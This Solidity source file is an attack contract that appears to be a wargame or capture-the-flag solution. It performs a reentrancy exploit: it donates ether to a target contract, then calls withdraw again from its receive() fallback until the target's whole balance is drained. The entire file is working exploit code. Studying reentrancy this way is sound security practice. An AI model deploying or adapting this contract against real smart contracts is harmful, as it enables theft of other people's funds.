// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Reentrancy {
    IReentrancy reentrancyInstance;

    constructor(address _instanceAddress) payable {
        reentrancyInstance = IReentrancy(_instanceAddress);
    }

    function attack() external payable {
        require(msg.value >= address(reentrancyInstance).balance);
        reentrancyInstance.donate{value: msg.value}(address(this));
        reentrancyInstance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrancyInstance).balance > 0) {
            reentrancyInstance.withdraw(address(reentrancyInstance).balance);
        }
    }
}
